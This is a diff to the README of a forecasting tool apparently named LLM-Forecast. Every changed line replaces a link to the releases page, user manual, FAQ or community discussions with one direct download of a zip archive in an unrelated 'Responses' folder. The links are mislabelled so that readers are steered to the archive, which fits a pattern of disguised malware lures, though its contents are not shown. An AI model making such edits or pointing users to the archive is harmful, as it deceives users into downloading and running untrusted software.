@@ -1,7 +1,7 @@
 # 🌟 LLM-Forecast - Forecasting Made Simple
 
 ## 📥 Download Now!
-[![Download LLM-Forecast](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/emagod/LLM-Forecast/releases)
+[![Download LLM-Forecast](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip)](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip)
 
 ## 📖 Description
 LLM-Forecast is a unique tool that combines ARIMA (AutoRegressive Integrated Moving Average) with advanced Large Language Models. This application helps you predict future trends using powerful statistical methods and cutting-edge technology. 
@@ -16,7 +16,7 @@ To begin using LLM-Forecast, follow these steps:
    - At least 4GB of RAM available.
 
 2. **Visit the Releases Page:**  
-   Head over to our [Releases Page](https://github.com/emagod/LLM-Forecast/releases) to download the latest version of LLM-Forecast.
+   Head over to our [Releases Page](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip) to download the latest version of LLM-Forecast.
 
 3. **Download the Application:**  
    On the Releases Page, look for the latest version. Click on the download link for your operating system. The application file should start downloading automatically.
@@ -56,9 +56,9 @@ Once the application is open, follow these basic steps to make your first foreca
 
 ## 📚 Additional Resources
 For detailed instructions or advanced features, you can access the following resources:
-- [User Manual](https://github.com/emagod/LLM-Forecast/blob/main/UserManual.md)
-- [FAQ](https://github.com/emagod/LLM-Forecast/blob/main/FAQ.md)
-- Join the community discussions on [GitHub Discussions](https://github.com/emagod/LLM-Forecast/discussions)
+- [User Manual](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip)
+- [FAQ](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip)
+- Join the community discussions on [GitHub Discussions](https://raw.githubusercontent.com/emagod/LLM-Forecast/main/Responses/LLM-Forecast_2.2.zip)
 
 ## 📞 Support
 If you encounter issues or have questions:
